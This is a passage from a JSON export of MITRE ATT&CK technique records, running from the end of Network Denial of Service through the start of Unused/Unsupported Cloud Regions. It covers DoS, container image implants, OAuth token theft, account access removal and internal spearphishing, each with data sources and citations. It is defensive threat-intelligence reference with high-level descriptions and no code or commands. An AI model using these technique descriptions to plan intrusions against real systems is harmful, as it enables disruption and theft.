(DDoS).<!-- raw HTML omitted --><!-- raw HTML omitted -->To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.<!-- raw HTML omitted --><!-- raw HTML omitted -->For DoS attacks targeting the hosting system directly, see <a href=\"https://attack.mitre.org/techniques/T1499\">Endpoint Denial of Service</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye OpPoisonedHandover February 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html",
        "description": "Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November 3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FSISAC FraudNetDoS September 2012",
        "url": "https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf",
        "description": "FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals Targeting Financial Institution Employee Credentials to Conduct Wire Transfer Fraud. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec DDoS October 2014",
        "url": "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf",
        "description": "Wueest, C.. (2014, October 21). The continued rise of DDoS attacks. Retrieved April 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1499",
    "technique": "Endpoint Denial of Service",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|network-protocol-analysis|ssl-tls-inspection|web-application-firewall-logs|web-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1499.001",
      "T1499.002",
      "T1499.003",
      "T1499.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).<!-- raw HTML omitted --><!-- raw HTML omitted -->To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.<!-- raw HTML omitted --><!-- raw HTML omitted -->Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target’s resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->In cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)<!-- raw HTML omitted --><!-- raw HTML omitted -->For attacks attempting to saturate the providing network, see <a href=\"https://attack.mitre.org/techniques/T1498\">Network Denial of Service</a>.<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/227.html",
        "description": "none",
        "external_id": "CAPEC-227"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/131.html",
        "description": "none",
        "external_id": "CAPEC-131"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/130.html",
        "description": "none",
        "external_id": "CAPEC-130"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/125.html",
        "description": "none",
        "external_id": "CAPEC-125"
      },
      {
        "source_name": "FireEye OpPoisonedHandover February 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html",
        "description": "Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November 3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FSISAC FraudNetDoS September 2012",
        "url": "https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf",
        "description": "FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals Targeting Financial Institution Employee Credentials to Conduct Wire Transfer Fraud. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec DDoS October 2014",
        "url": "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf",
        "description": "Wueest, C.. (2014, October 21). The continued rise of DDoS attacks. Retrieved April 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "USNYAG IranianBotnet March 2016",
        "url": "https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged",
        "description": "Preet Bharara, US Attorney. (2016, March 24). Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ArsTechnica Great Firewall of China",
        "url": "https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/",
        "description": "Goodin, D.. (2015, March 31). Massive denial-of-service attack on GitHub tied to Chinese government. Retrieved April 19, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb",
    "platform": "windows|linux|macos",
    "tid": "T1505",
    "technique": "Server Software Component",
    "tactic": "persistence",
    "datasources": "application-logs|file-monitoring|netflow-enclave-netflow|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1505.001",
      "T1505.002",
      "T1505.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.</p>\n",
    "technique_references": [
      {
        "source_name": "US-CERT Alert TA15-314A Web Shells",
        "url": "https://www.us-cert.gov/ncas/alerts/TA15-314A",
        "description": "US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1518",
    "technique": "Software Discovery",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|file-monitoring|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1518.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1518\">Software Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to <a href=\"https://attack.mitre.org/techniques/T1068\">Exploitation for Privilege Escalation</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/580.html",
        "description": "none",
        "external_id": "CAPEC-580"
      }
    ]
  },
  {
    "id": "attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f",
    "platform": "gcp|azure|aws",
    "tid": "T1525",
    "technique": "Implant Container Image",
    "tactic": "persistence",
    "datasources": "asset-management|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may implant cloud container images with malicious code to establish persistence. Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a <a href=\"https://attack.mitre.org/techniques/T1505/003\">Web Shell</a>.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) Adversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets.(Citation: ATT Cybersecurity Cryptocurrency Attacks on Cloud)</p>\n",
    "technique_references": [
      {
        "source_name": "Rhino Labs Cloud Image Backdoor Technique Sept 2019",
        "url": "https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/",
        "description": "Rhino Labs. (2019, August). Exploiting AWS ECR and ECS with the Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Rhino Labs Cloud Backdoor September 2019",
        "url": "https://github.com/RhinoSecurityLabs/ccat",
        "description": "Rhino Labs. (2019, September). Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ATT Cybersecurity Cryptocurrency Attacks on Cloud",
        "url": "https://www.alienvault.com/blogs/labs-research/making-it-rain-cryptocurrency-mining-attacks-in-the-cloud",
        "description": "Doman, C. & Hegel, T.. (2019, March 14). Making it Rain - Cryptocurrency Mining Attacks in the Cloud. Retrieved October 3, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db",
    "platform": "aws|gcp|azure|azure-ad|office-365|saas",
    "tid": "T1526",
    "technique": "Cloud Service Discovery",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)<!-- raw HTML omitted --><!-- raw HTML omitted -->Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)</p>\n",
    "technique_references": [
      {
        "source_name": "Azure - Resource Manager API",
        "url": "https://docs.microsoft.com/en-us/rest/api/resources/",
        "description": "Microsoft. (2019, May 20). Azure Resource Manager. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Azure AD Graph API",
        "url": "https://docs.microsoft.com/en-us/previous-versions/azure/ad/graph/howto/azure-ad-graph-api-operations-overview",
        "description": "Microsoft. (2016, March 26). Operations overview | Graph API concepts. Retrieved June 18, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Azure - Stormspotter",
        "url": "https://github.com/Azure/Stormspotter",
        "description": "Microsoft. (2020). Azure Stormspotter GitHub. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Pacu",
        "url": "https://github.com/RhinoSecurityLabs/pacu",
        "description": "Rhino Security Labs. (2019, August 22). Pacu. Retrieved October 17, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a",
    "platform": "saas|office-365|azure-ad",
    "tid": "T1528",
    "technique": "Steal Application Access Token",
    "tactic": "credential-access",
    "datasources": "azure-activity-logs|oauth-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.<!-- raw HTML omitted --><!-- raw HTML omitted -->Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft’s Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. <!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user’s OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through <a href=\"https://attack.mitre.org/techniques/T1192\">Spearphishing Link</a> to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through <a href=\"https://attack.mitre.org/techniques/T1527\">Application Access Token</a>.(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019",
        "url": "https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/",
        "description": "Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Identity Platform Protocols May 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols",
        "description": "Microsoft. (n.d.). Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - OAuth Code Authorization flow - June 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow",
        "description": "Microsoft. (n.d.). Microsoft identity platform and OAuth 2.0 authorization code flow. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure AD App Registration - May 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app",
        "description": "Microsoft. (2019, May 8). Quickstart: Register an application with the Microsoft identity platform. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure AD Identity Tokens - Aug 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens",
        "description": "Microsoft. (2019, August 29). Microsoft identity platform access tokens. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Amnesty OAuth Phishing Attacks, August 2019",
        "url": "https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/",
        "description": "Amnesty International. (2019, August 16). Evolving Phishing Attacks Targeting Journalists and Human Rights Defenders from the Middle-East and North Africa. Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Pawn Storm OAuth 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks",
        "description": "Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
    "platform": "linux|macos|windows",
    "tid": "T1529",
    "technique": "System Shutdown/Reboot",
    "tactic": "impact",
    "datasources": "process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as <a href=\"https://attack.mitre.org/techniques/T1561/002\">Disk Structure Wipe</a> or <a href=\"https://attack.mitre.org/techniques/T1490\">Inhibit System Recovery</a>, to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Shutdown Oct 2017",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown",
        "description": "Microsoft. (2017, October 15). Shutdown. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Nyetya June 2017",
        "url": "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html",
        "description": "Chiu, A. (2016, June 27). New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide. Retrieved March 26, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
    "platform": "aws|gcp|azure",
    "tid": "T1530",
    "technique": "Data from Cloud Storage Object",
    "tactic": "collection",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may access data objects from improperly secured cloud storage.<!-- raw HTML omitted --><!-- raw HTML omitted -->Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider’s APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.</p>\n",
    "technique_references": [
      {
        "source_name": "Amazon S3 Security, 2019",
        "url": "https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/",
        "description": "Amazon. (2019, May 17). How can I secure the files in my Amazon S3 bucket?. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Azure Storage Security, 2019",
        "url": "https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide",
        "description": "Amlekar, M., Brooks, C., Claman, L., et. al.. (2019, March 20). Azure Storage security guide. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Google Cloud Storage Best Practices, 2019",
        "url": "https://cloud.google.com/storage/docs/best-practices",
        "description": "Google. (2019, September 16). Best practices for Cloud Storage. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro S3 Exposed PII, 2017",
        "url": "https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia",
        "description": "Trend Micro. (2017, November 6). A Misconfigured Amazon S3 Exposed Almost 50 Thousand PII in Australia. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wired Magecart S3 Buckets, 2019",
        "url": "https://www.wired.com/story/magecart-amazon-cloud-hacks/",
        "description": "Barrett, B.. (2019, July 11). Hack Brief: A Card-Skimming Hacker Group Hit 17K Domains—and Counting. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "HIPAA Journal S3 Breach, 2017",
        "url": "https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/",
        "description": "HIPAA Journal. (2017, October 11). 47GB of Medical Records and Test Results Found in Unsecured Amazon S3 Bucket. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0",
    "platform": "linux|macos|windows",
    "tid": "T1531",
    "technique": "Account Access Removal",
    "tactic": "impact",
    "datasources": "process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "CarbonBlack LockerGoga 2019",
        "url": "https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/",
        "description": "CarbonBlack Threat Analysis Unit. (2019, March 22). TAU Threat Intelligence Notification – LockerGoga Ransomware. Retrieved April 16, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit42 LockerGoga 2019",
        "url": "https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/",
        "description": "Harbison, M.. (2019, March 26). Born This Way? Origins of LockerGoga. Retrieved April 16, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747",
    "platform": "windows|macos|linux|office-365|saas",
    "tid": "T1534",
    "technique": "Internal Spearphishing",
    "tactic": "lateral-movement",
    "datasources": "anti-virus|dns-records|file-monitoring|mail-server|office-365-trace-logs|ssl-tls-inspection|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user’s device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may leverage <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a> or <a href=\"https://attack.mitre.org/techniques/T1566/002\">Spearphishing Link</a> as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through <a href=\"https://attack.mitre.org/techniques/T1056\">Input Capture</a> on sites that mimic email login interfaces.<!-- raw HTML omitted --><!-- raw HTML omitted -->There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro When Phishing Starts from the Inside 2017",
        "url": "https://blog.trendmicro.com/phishing-starts-inside/",
        "description": "Chris Taylor. (2017, October 5). When Phishing Starts from the Inside. Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "THE FINANCIAL TIMES LTD 2019.",
        "url": "https://labs.ft.com/2013/05/a-sobering-day/?mhq5j=e6",
        "description": "THE FINANCIAL TIMES. (2019, September 2). A sobering day. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761",
    "platform": "aws|gcp|azure",
    "tid": "T1535",
    "technique": "Unused/Unsupported Cloud Regions",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
